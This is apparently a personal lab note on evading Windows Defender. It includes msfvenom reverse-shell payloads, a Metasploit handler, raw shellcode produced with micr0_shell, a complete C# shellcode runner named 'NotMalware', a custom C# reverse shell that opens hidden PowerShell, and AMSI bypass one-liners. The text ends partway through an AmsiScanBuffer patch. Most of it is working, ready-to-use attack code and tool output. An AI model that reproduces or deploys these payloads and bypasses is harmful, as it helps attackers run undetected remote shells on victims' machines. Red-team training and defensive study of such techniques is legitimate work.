---
title: Antivirus Evasion
date: 2026-07-19
ShowToc: true
draft: false
TocOpen: true
password:
isPrivate: true
tags:
  - blog
  - note-ad
  - note-windows
lastmod: 2026-07-24T06:46:45.427Z
---
# Box Info

### Static Analysis

```
┌─[✗]─[tester@parrot]─[~/Desktop/windows_parrot_shares]
└──╼ $sudo msfconsole
Metasploit tip: Search can apply complex filters such as search cve:2009 
type:exploit, see all the filters with help search
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v6.4.136-dev                               ]
+ -- --=[ 2,636 exploits - 1,331 auxiliary - 2,149 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 192.168.154.10
LHOST => 192.168.154.10
[msf](Jobs:0 Agents:0) exploit(multi/handler) >>  set LPORT 8081
LPORT => 8081
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit
[*] Started reverse TCP handler on 192.168.154.10:8081 

```

```
┌─[tester@parrot]─[~/Desktop/windows_parrot_shares]
└──╼ $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.154.10  LPORT=8081  -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
[ble: elapsed 13.552s (CPU 99.6%)] msfvenom -p windows/x64/meterpreter/

```

```
PS C:\Users\test\Downloads> .\reverse.exe
```

```
Meterpreter 1)(C:\Users\test\Downloads) > 
```

Using the [Get-MpThreat](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreat?view=windowsserver2022-ps) and [Get-MpThreatDetection](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreatdetection?view=windowsserver2022-ps) commands, we can see the file `NotMalware.exe` was classified as `Trojan:Win64/Meterpreter.E` before it was executed.

> Get-MpThreat

```
PS C:\Users\test\Downloads>  Get-MpThreat


CategoryID       : 8
DidThreatExecute : False
IsActive         : False
Resources        :
RollupStatus     : 33
SchemaVersion    : 1.0.0.0
SeverityID       : 5
ThreatID         : 2147721833
ThreatName       : Trojan:Win64/Meterpreter.E
TypeID           : 0
PSComputerName   :

CategoryID       : 34
DidThreatExecute : True
IsActive         : False
Resources        :
RollupStatus     : 65
SchemaVersion    : 1.0.0.0
SeverityID       : 5
ThreatID         : 2147741622
ThreatName       : VirTool:Win32/DefenderTamperingRestore
TypeID           : 0
PSComputerName   :

CategoryID       : 34
DidThreatExecute : False
IsActive         : False
Resources        :
RollupStatus     : 33
SchemaVersion    : 1.0.0.0
SeverityID       : 4
ThreatID         : 2147744878
ThreatName       : HackTool:Win32/NetCat!MSR
TypeID           : 0
PSComputerName   :
```

> Get-MpThreatDetection

```
PS C:\Users\test\Downloads> Get-MpThreatDetection


ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.26060.3008
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 0
DetectionID                    : {67CAAE0E-322C-486F-8C6B-3B4DCB4519B2}
DetectionSourceTypeID          : 4
DomainUser                     : DESKTOP-ACG20IL\test
InitialDetectionTime           : 7/13/2026 3:12:48 AM
LastThreatStatusChangeTime     : 7/13/2026 3:12:53 AM
ProcessName                    : Unknown
RemediationTime                : 7/13/2026 3:12:53 AM
Resources                      : {file:_C:\Users\test\Downloads\Unconfirmed 312378.crdownload, webfile:_C:\Users\test\Downloads\Unconfirmed
                                 312378.crdownload|https://raw.githubusercontent.com/int0x33/nc.exe/refs/heads/master/nc64.exe|pid:11284,ProcessStart:134284111683755960}
ThreatID                       : 2147744878
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.26060.3008
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 0
DetectionID                    : {19EFB229-0BE1-4A59-8B23-36AE58166A41}
DetectionSourceTypeID          : 4
DomainUser                     : DESKTOP-ACG20IL\test
InitialDetectionTime           : 7/14/2026 1:14:41 AM
LastThreatStatusChangeTime     : 7/14/2026 1:14:47 AM
ProcessName                    : Unknown
RemediationTime                : 7/14/2026 1:14:47 AM
Resources                      : {file:_C:\Users\test\Downloads\tester.exe, file:_C:\Users\test\Downloads\Unconfirmed 479472.crdownload,
                                 webfile:_C:\Users\test\Downloads\tester.exe|http://10.1.110.173:28276/tester.exe|pid:4796,ProcessStart:134284904810245603, webfile:_C:\Users\test\Downloads\Unconfirmed
                                 479472.crdownload|http://10.1.110.173:28276/tester.exe|pid:11384,ProcessStart:134284904825890131}
ThreatID                       : 2147721833
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.26060.3008
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 0
DetectionID                    : {E117D1C9-ECDB-4418-9CBF-5AE6833028F7}
DetectionSourceTypeID          : 4
DomainUser                     : DESKTOP-ACG20IL\test
InitialDetectionTime           : 7/13/2026 2:48:49 AM
LastThreatStatusChangeTime     : 7/13/2026 2:48:54 AM
ProcessName                    : Unknown
RemediationTime                : 7/13/2026 2:48:54 AM
Resources                      : {file:_C:\Users\test\Downloads\nc64.exe,
                                 webfile:_C:\Users\test\Downloads\nc64.exe|https://raw.githubusercontent.com/int0x33/nc.exe/refs/heads/master/nc64.exe|pid:4648,ProcessStart:134284097287496696}
ThreatID                       : 2147744878
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.26060.3008
CleaningActionID               : 2
CurrentThreatExecutionStatusID : 0
DetectionID                    : {2B4F20D4-67F2-4EFC-A17D-F708B9136E2A}
DetectionSourceTypeID          : 2
DomainUser                     : NT AUTHORITY\SYSTEM
InitialDetectionTime           : 7/13/2026 9:08:54 PM
LastThreatStatusChangeTime     : 7/13/2026 9:09:51 PM
ProcessName                    : Unknown
RemediationTime                : 7/13/2026 9:09:51 PM
Resources                      : {regkeyvalue:_hklm\software\microsoft\windows defender\spynet\\DisableBlockAtFirstSeen}
ThreatID                       : 2147741622
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 3
PSComputerName                 :

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.26060.3008
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 0
DetectionID                    : {B5E3AA78-DC90-4BE2-A987-F96F4639A3F2}
DetectionSourceTypeID          : 4
DomainUser                     : DESKTOP-ACG20IL\test
InitialDetectionTime           : 7/14/2026 1:14:32 AM
LastThreatStatusChangeTime     : 7/14/2026 1:14:37 AM
ProcessName                    : Unknown
RemediationTime                : 7/14/2026 1:14:37 AM
Resources                      : {file:_C:\Users\test\Downloads\Unconfirmed 171723.crdownload, webfile:_C:\Users\test\Downloads\Unconfirmed
                                 171723.crdownload|http://10.1.110.173:28276/tester.exe|pid:2288,ProcessStart:134284904719194697}
ThreatID                       : 2147721833
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.26060.3008
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 0
DetectionID                    : {D325398B-0852-41E4-BC5C-A2DA450C5DE7}
DetectionSourceTypeID          : 4
DomainUser                     : DESKTOP-ACG20IL\test
InitialDetectionTime           : 7/13/2026 2:48:38 AM
LastThreatStatusChangeTime     : 7/13/2026 2:48:43 AM
ProcessName                    : Unknown
RemediationTime                : 7/13/2026 2:48:43 AM
Resources                      : {file:_C:\Users\test\Downloads\Unconfirmed 26453.crdownload, webfile:_C:\Users\test\Downloads\Unconfirmed
                                 26453.crdownload|https://raw.githubusercontent.com/int0x33/nc.exe/refs/heads/master/nc64.exe|pid:1820,ProcessStart:134284097176242344}
ThreatID                       : 2147744878
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.26060.3008
CleaningActionID               : 2
CurrentThreatExecutionStatusID : 1
DetectionID                    : {E432E16A-940F-4E0D-AAEB-2F474E45952C}
DetectionSourceTypeID          : 3
DomainUser                     : DESKTOP-ACG20IL\test
InitialDetectionTime           : 7/14/2026 1:15:23 AM
LastThreatStatusChangeTime     : 7/14/2026 1:15:47 AM
ProcessName                    : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RemediationTime                : 7/14/2026 1:15:47 AM
Resources                      : {file:_C:\Users\test\Desktop\tester.exe}
ThreatID                       : 2147721833
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 3
PSComputerName                 :
```

### Dynamic Analysis

#### build the ThreatCheck

```
git clone https://github.com/rasta-mouse/ThreatCheck.git
```

```
notepad.exe ThreatCheck.csproj
```

```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net10.0</TargetFramework>
    <ImplicitUsings>disable</ImplicitUsings>
    <Nullable>disable</Nullable>
    <LangVersion>12</LangVersion>
    <Platforms>AnyCPU</Platforms>
    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="CommandLineParser" Version="2.9.1" />
    <PackageReference Include="Microsoft.PowerShell.5.1.ReferenceAssemblies" Version="1.0.0" />
  </ItemGroup>

</Project>
```

```
PS C:\Users\test\Desktop\ThreatCheck> dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
Restore succeeded with 1 warning(s) in 3.3s
    C:\Users\test\Desktop\ThreatCheck\ThreatCheck\ThreatCheck.csproj : warning NU1701: Package 'Microsoft.PowerShell.5.1.ReferenceAssemblies 1.0.0' was restored using '.NETFramework,Version=v4.6.1, .NETFramework,Version=v4.6.2, .NETFramework,Version=v4.7, .NETFramework,Version=v4.7.1, .NETFramework,Version=v4.7.2, .NETFramework,Version=v4.8, .NETFramework,Version=v4.8.1' instead of the project target framework 'net10.0'. This package may not be fully compatible with your project.
  ThreatCheck net10.0 win-x64 succeeded with 1 warning(s) (1.5s) → ThreatCheck\bin\Release\net10.0\win-x64\publish\
    C:\Users\test\Desktop\ThreatCheck\ThreatCheck\ThreatCheck.csproj : warning NU1701: Package 'Microsoft.PowerShell.5.1.ReferenceAssemblies 1.0.0' was restored using '.NETFramework,Version=v4.6.1, .NETFramework,Version=v4.6.2, .NETFramework,Version=v4.7, .NETFramework,Version=v4.7.1, .NETFramework,Version=v4.7.2, .NETFramework,Version=v4.8, .NETFramework,Version=v4.8.1' instead of the project target framework 'net10.0'. This package may not be fully compatible with your project.

Build succeeded with 2 warning(s) in 6.2s
```

```
PS C:\Users\test\Desktop\ThreatCheck\ThreatCheck\bin\Release\net10.0\win-x64\publish> ls


    Directory: C:\Users\test\Desktop\ThreatCheck\ThreatCheck\bin\Release\net10.0\win-x64\publish


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/19/2026   3:09 AM       75253371 ThreatCheck.exe
-a----         7/19/2026   3:09 AM          14428 ThreatCheck.pdb

```

#### Detect the code

```
PS C:\Users\test\Desktop> .\ThreatCheck.exe -f ..\Downloads\reverse.exe
[+] Target file size: 7680 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x1C56
00001B56   CE 75 E5 E8 93 00 00 00  48 83 EC 10 48 89 E2 4D   Iuåè....H.ì.H.âM
00001B66   31 C9 6A 04 41 58 48 89  F9 41 BA 53 10 78 44 FF   1Éj.AXH.ùAºS.xDÿ
00001B76   D5 83 F8 00 7E 55 48 83  C4 20 5E 89 F6 6A 40 41   O.o.~UH.Ä ^.öj@A
00001B86   59 68 00 10 00 00 41 58  48 89 F2 48 31 C9 41 BA   Yh....AXH.òH1ÉAº
00001B96   FB F7 24 9A FF D5 48 89  C3 49 89 C7 4D 31 C9 49   û÷$.ÿOH.AI.ÇM1ÉI
00001BA6   89 F0 48 89 DA 48 89 F9  41 BA 53 10 78 44 FF D5   .dH.UH.ùAºS.xDÿO
00001BB6   83 F8 00 7D 28 58 41 57  59 68 00 40 00 00 41 58   .o.}(XAWYh.@..AX
00001BC6   6A 00 5A 41 BA 21 C1 AF  AA FF D5 57 59 41 BA 82   j.ZAº!A_ªÿOWYAº.
00001BD6   C0 56 A7 FF D5 49 FF CE  E9 3C FF FF FF 48 01 C3   AVÿOIÿIé<ÿÿÿH.A
00001BE6   48 29 C6 48 85 F6 75 B4  41 FF E7 58 6A 00 59 41   H)ÆH.öu'AÿçXj.YA
00001BF6   BA 06 48 43 D1 FF D5 00  00 00 28 52 00 00 00 00   º.HCÑÿO...(R....
00001C06   00 00 FF FF FF FF 38 52  00 00 00 20 00 00 00 00   ..ÿÿÿÿ8R... ....
00001C16   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
00001C26   00 00 46 52 00 00 00 00  00 00 00 00 00 00 00 00   ..FR............
00001C36   00 00 4B 45 52 4E 45 4C  33 32 2E 64 6C 6C 00 00   ..KERNEL32.dll..
00001C46   19 06 56 69 72 74 75 61  6C 50 72 6F 74 65 63 74   ..VirtualProtect
```

#### Option 2: Changing the Payload

#### micr0\_shell

> micr0\_shell

As an example, let's use micr0\_shell. From the project description we can see that this program generates "reverse shell shellcode for Windows x64".

```
┌─[✗]─[tester@parrot]─[~/Desktop/Tools/micr0_shell]
└──╼ $git clone https://github.com/senzee1984/micr0_shell.git
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/Tools/micr0_shell]
└──╼ $pip install -r requirements.txt  --break-system-packages
Defaulting to user installation because normal site-packages is not writeable
Collecting keystone (from -r requirements.txt (line 1))
  Downloading keystone-29.0.2-py3-none-any.whl.metadata (3.9 kB)
Collecting keystone-engine (from -r requirements.txt (line 2))
  Downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl.metadata (1.8 kB)
Collecting pbr!=2.1.0,>=2.0.0 (from keystone->-r requirements.txt (line 1))
  Downloading pbr-7.0.3-py2.py3-none-any.whl.metadata (3.8 kB)
Collecting WebOb>=1.7.1 (from keystone->-r requirements.txt (line 1))
  Downloading webob-1.8.10-py2.py3-none-any.whl.metadata (12 kB)
Requirement already satisfied: Flask!=0.11,>=1.0.2 in /usr/lib/python3/dist-pac
```

Using the uv can help you to solve the problem

```
┌─[✗]─[tester@parrot]─[~/Desktop/Tools/micr0_shell]
└──╼ $uv run --with keystone-engine micr0\ shell.py  -i 192.168.154.10 -p 8080 -l csharp

███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/micr0_shell
Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode
Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255


[+]Shellcode Settings:
******** IP Address: 192.168.154.10
******** Listening Port: 8080
******** Language of desired shellcode runner: csharp
******** Shellcode array variable name: buf
******** Shell: cmd
******** Shellcode Execution: false
******** Save Shellcode to file: false


[+]Payload size: 450 bytes

[+]Shellcode format for C#

byte[] buf= new byte[450] {
0x48,0x89,0xe5,0x40,0x80,0xe4,0xf0,0x48,0x83,0xec,0x60,0x48,0x89,0x6c,0x24,0x10,0x48,0x89,0xe5,0x48,
0x31,0xc9,0x65,0x48,0x8b,0x41,0x60,0x48,0x8b,0x40,0x18,0x48,0x8b,0x40,0x30,0x48,0x8b,0x04,0x08,0x48,
0x8b,0x04,0x08,0x48,0x8b,0x40,0x10,0x48,0x89,0x45,0x48,0xeb,0x61,0x4d,0x31,0xdb,0x41,0xb3,0x3c,0x46,
0x8b,0x04,0x19,0x49,0x01,0xc8,0x41,0x80,0xc3,0x4c,0x47,0x8b,0x04,0x18,0x49,0x01,0xc8,0x45,0x8b,0x48,
0x18,0x45,0x8b,0x50,0x20,0x49,0x01,0xca,0x49,0xff,0xc9,0x43,0x8b,0x34,0x8a,0x48,0x01,0xce,0x48,0x31,
0xc0,0x4d,0x31,0xdb,0xfc,0xac,0x84,0xc0,0x74,0x09,0x41,0xc1,0xcb,0x0d,0x41,0x01,0xc3,0xeb,0xf2,0x44,
0x39,0xda,0x75,0xdc,0x41,0x8b,0x40,0x24,0x48,0x01,0xc8,0x42,0x0f,0xb7,0x14,0x48,0x41,0x8b,0x40,0x1c,
0x48,0x01,0xc8,0x8b,0x04,0x90,0x48,0x01,0xc8,0xc3,0x48,0x8b,0x4d,0x48,0xba,0x72,0xfe,0xb3,0x16,0xe8,
0x91,0xff,0xff,0xff,0x48,0x89,0x45,0x18,0x48,0x8b,0x4d,0x48,0xba,0x8e,0x4e,0x0e,0xec,0xe8,0x7f,0xff,
0xff,0xff,0x48,0x89,0x45,0x20,0x48,0x31,0xc9,0x66,0xb9,0x6c,0x6c,0x51,0x48,0xb9,0x57,0x53,0x32,0x5f,
0x33,0x32,0x2e,0x64,0x51,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0xff,0x55,0x20,0x48,0x89,0x45,0x40,0x48,
0x8b,0x4d,0x40,0xba,0xcb,0xed,0xfc,0x3b,0xe8,0x4c,0xff,0xff,0xff,0x48,0x89,0x45,0x28,0x48,0x8b,0x4d,
0x40,0xba,0xd9,0x09,0xf5,0xad,0xe8,0x3a,0xff,0xff,0xff,0x48,0x89,0x45,0x30,0x48,0x8b,0x4d,0x40,0xba,
0xec,0xf9,0xaa,0x60,0xe8,0x28,0xff,0xff,0xff,0x48,0x89,0x45,0x38,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,
0x7f,0x48,0x83,0xec,0x7f,0x48,0x83,0xec,0x62,0x48,0x89,0xe2,0xff,0x55,0x28,0x48,0x89,0xec,0x48,0x31,
0xd2,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x52,0x52,0x52,0x52,0xb1,0x02,0xb2,0x01,0x41,0xb0,0x06,0xff,0x55,
0x30,0x48,0x89,0x44,0x24,0x10,0x48,0x89,0x44,0x24,0x18,0x48,0x89,0x44,0x24,0x20,0x89,0xc1,0x48,0xb8,
0xfd,0xff,0xe0,0x6f,0x3f,0x57,0x65,0xf5,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe2,0x41,0xb0,0x10,0x48,0x83,
0xec,0x20,0xff,0x55,0x38,0x48,0x31,0xc9,0xb1,0x01,0x48,0xc1,0xc9,0x18,0x48,0x89,0x4c,0x24,0x20,0x48,
0x89,0x44,0x24,0x10,0x48,0x89,0x44,0x24,0x08,0x50,0x50,0x6a,0x68,0x49,0x89,0xe0,0x48,0xb9,0x9c,0x92,
0x9b,0xd1,0x9a,0x87,0x9a,0xff,0x48,0xf7,0xd1,0x51,0x51,0x48,0x89,0xe2,0x48,0x8d,0x4c,0x24,0xe0,0x51,
0x41,0x50,0x50,0x50,0x48,0x31,0xc9,0xb1,0x01,0xc1,0xc1,0x1b,0x51,0x6a,0x01,0x48,0x83,0xec,0x20,0x48,
0x89,0xc1,0xff,0x55,0x18,0x48,0x8b,0x65,0x10,0xc3};

```

paste to https://gchq.github.io/CyberChef/#recipe=From\_Hex('0x%20with%20comma')AES\_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,'Off')To\_Base64('A-Za-z0-9%2B/%3D')

#### Build the Notmalware.exe

Open Visual Studio. Click **Create a new project** on the startup splash window.

![Pasted image 20260719194129.png](/ob/Pasted%20image%2020260719194129.png)

In the search box at the top, type `Console App`.

![Pasted image 20260719194327.png](/ob/Pasted%20image%2020260719194327.png)

Scroll down until you find **Console App (.NET Framework)** with the C# tag. *Make sure it says (.NET Framework) in parentheses, not just Console App.*

![Pasted image 20260719194416.png](/ob/Pasted%20image%2020260719194416.png)

```
using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
            byte[] buf = new byte[] {< SNIP >};

            // Allocate RW space for shellcode
            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

            // Execute the shellcode in a new thread
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}
```

![Pasted image 20260719194519.png](/ob/Pasted%20image%2020260719194519.png)

paste the code into code

![Pasted image 20260719194724.png](/ob/Pasted%20image%2020260719194724.png)

Look at the top toolbar in Visual Studio (just below the main menu options like File and Edit).\
You will see a dropdown menu that says **Debug**. Click it and switch it to **Release**.\
Directly next to the Release dropdown, there is another dropdown that usually says **Any CPU**. Click it.

The path in the

```
C:\Users\test\source\repos\NotMalware\NotMalware\bin\x64\Release
```

Run it

```
PS C:\Users\test\Desktop> .\NotMalware.exe
PS C:\Users\test\Desktop>
```

```
PS C:\Users\test\Desktop> .\ThreatCheck.exe -f .\NotMalware.exe
[+] No threat found!
```

```
┌─[tester@parrot]─[~/Desktop/Tools/micr0_shell]
└──╼ $rlwrap nc -nlvp  8080
Listening on 0.0.0.0 8080
Connection received on 192.168.154.20 54291

```

#### Option 3: Writing Custom Tools

System.Net.Sockets.TcpClient to handles the TCP connection\
System.Diagnostics.Process to spawn the cmd.exe or powershell.exe process\
System.IO.StreamReader, System.IO.StreamWriter to read/write to the TCP stream

```
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace RShell
{
    internal class Program
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it

        static void Main(string[] args)
        {
            // Check for correct number of arguments
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: RShell.exe <IP> <Port>");
                return;
            }

            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect(args[0], int.Parse(args[1]));

                // Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }
        
        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}
```

### Process Injection

Let's open up `Visual Studio` and create a new `C# Console App (.NET Framework)` called `AlsoNotMalware`. Before we can use any of the `Windows API` functions we discussed above, we will need to import them. Similarly to `NotMalware`, we will use [P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke), a technology which allows us to access functions in unmanaged libraries from our managed (C#) code. All in all, we will need the following definitions:

![Pasted image 20260720173944.png](/ob/Pasted%20image%2020260720173944.png)

### Antimalware Scan Interface

functions [AmsiScanBuffer](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) and [AmsiScanString](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring) to scan input for malicious content

### String Manipulation

An important part of the following few bypasses will be `string manipulation`. Take a look at the screenshot below, the string `"amsiUtils"` triggers a response from `Microsoft Defender Antivirus`. By simply splitting the string into two parts (`"amsi" and "Utils"`) , or by utilizing `base64-encoding`, it is possible to sneak past `Microsoft Defender Antivirus`.

#### Bypass 1: Setting amsiInitFailed

```
PS C:\Users\test\Desktop> amsiUtils
amsiUtils : The term 'amsiUtils' is not recognized as the name of a cmdlet, function, script file, or operable
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ amsiUtils
+ ~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (amsiUtils:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\test\Desktop> 'amsi' + 'Utils'
amsiUtils
```

Nowadays, antivirus solutions block this `AMSI` bypass command when run in `PowerShell`; however, the technique still works with some adaption.

Looking at the `ScanContent` method specifically, we can see that it returns `AMSI_RESULT_NOT_DETECTED` if the value of the `amsiInitFailed` variable is set to `true`.

![Pasted image 20260720181719.png](/ob/Pasted%20image%2020260720181719.png)

```
PS C:\Users\test\Desktop> [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)

PS C:\Users\test\Desktop> 'amsiUtils'
amsiUtils
```

#### Bypass 2: Patching amsiScanBuffer

Looking up [common HRESULT values](https://learn.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values), we can arbitrarily pick `E_FAIL` which has the value `0x80004005`.

Using the [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm) tool, we can generate shellcode.

```
mov eax, 0x80004005;
ret;
```

![Pasted image 20260720182034.png](/ob/Pasted%20image%2020260720182034.png)

With the following `PowerShell`, we can then load `amsi.dll`, get the address of `AmsiScanBuffer` and overwrite the beginning with our shellcode.

```
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
